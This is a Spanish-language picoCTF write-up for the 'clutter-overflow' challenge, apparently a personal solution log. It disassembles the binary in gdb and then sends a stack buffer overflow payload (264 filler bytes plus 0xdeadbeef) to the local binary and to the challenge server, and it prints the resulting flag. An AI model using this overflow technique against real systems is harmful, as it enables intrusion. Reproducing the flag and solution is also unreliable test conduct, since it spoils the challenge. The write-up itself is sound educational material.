# clutter-overflow

## Descripción
Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`

---

|Challenge Endpoints|
|---|
|Download chall.c|[chall.c](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c)|
|Download chall|[chall](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall)|

## Pistas
- 

## Solución

```
eltetor14-picoctf@webshell:~$ wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall
--2023-05-30 23:09:40--  https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.156.172.120, 108.156.172.74, 108.156.172.42, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.156.172.120|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12704 (12K) [binary/octet-stream]
Saving to: 'chall'

chall                                           100%[======================================================================================================>]  12.41K  --.-KB/s    in 0s      

2023-05-30 23:09:41 (375 MB/s) - 'chall' saved [12704/12704]

eltetor14-picoctf@webshell:~$ gdb -q chall
Reading symbols from chall...
(No debugging symbols found in chall)
(gdb) disassemble main 
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:     push   %rbp
   0x00000000004006c8 <+1>:     mov    %rsp,%rbp
   0x00000000004006cb <+4>:     sub    $0x110,%rsp
   0x00000000004006d2 <+11>:    movq   $0x0,-0x8(%rbp)
   0x00000000004006da <+19>:    mov    0x20197f(%rip),%rax        # 0x602060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e1 <+26>:    mov    $0x0,%esi
   0x00000000004006e6 <+31>:    mov    %rax,%rdi
   0x00000000004006e9 <+34>:    call   0x4005a0 <setbuf@plt>
   0x00000000004006ee <+39>:    mov    0x20197b(%rip),%rax        # 0x602070 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+46>:    mov    $0x0,%esi
   0x00000000004006fa <+51>:    mov    %rax,%rdi
   0x00000000004006fd <+54>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400702 <+59>:    mov    0x201977(%rip),%rax        # 0x602080 <stderr@@GLIBC_2.2.5>
   0x0000000000400709 <+66>:    mov    $0x0,%esi
   0x000000000040070e <+71>:    mov    %rax,%rdi
   0x0000000000400711 <+74>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400716 <+79>:    mov    0x201933(%rip),%rax        # 0x602050 <HEADER>
   0x000000000040071d <+86>:    mov    %rax,%rdi
   0x0000000000400720 <+89>:    call   0x400590 <puts@plt>
   0x0000000000400725 <+94>:    lea    0x69d(%rip),%rdi        # 0x400dc9
   0x000000000040072c <+101>:   call   0x400590 <puts@plt>
   0x0000000000400731 <+106>:   lea    0x6ac(%rip),%rdi        # 0x400de4
   0x0000000000400738 <+113>:   call   0x400590 <puts@plt>
   0x000000000040073d <+118>:   lea    -0x110(%rbp),%rax
   0x0000000000400744 <+125>:   mov    %rax,%rdi
   0x0000000000400747 <+128>:   mov    $0x0,%eax
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    $0xdeadbeef,%eax
   0x0000000000400756 <+143>:   cmp    %rax,-0x8(%rbp)
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   0x000000000040075c <+149>:   mov    $0xdeadbeef,%esi
   0x0000000000400761 <+154>:   lea    0x690(%rip),%rdi        # 0x400df8
   0x0000000000400768 <+161>:   mov    $0x0,%eax
   0x000000000040076d <+166>:   call   0x4005c0 <printf@plt>
   0x0000000000400772 <+171>:   lea    0x6a6(%rip),%rdi        # 0x400e1f
   0x0000000000400779 <+178>:   call   0x400590 <puts@plt>
   0x000000000040077e <+183>:   lea    0x6b8(%rip),%rdi        # 0x400e3d
   0x0000000000400785 <+190>:   call   0x4005b0 <system@plt>
   0x000000000040078a <+195>:   jmp    0x4007ba <main+243>
   0x000000000040078c <+197>:   mov    -0x8(%rbp),%rax
   0x0000000000400790 <+201>:   mov    %rax,%rsi
--Type <RET> for more, q to quit, c to continue without paging--q
Quit
(gdb) exit
eltetor14-picoctf@webshell:~$ chmod +x ./chall 
eltetor14-picoctf@webshell:~$ (python -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./chall 
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
cat: flag.txt: No such file or directory
eltetor14-picoctf@webshell:~$ touch flag.txt
eltetor14-picoctf@webshell:~$ (python -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your trouble
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Bandera
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

## Notas adicionales

## Referencias
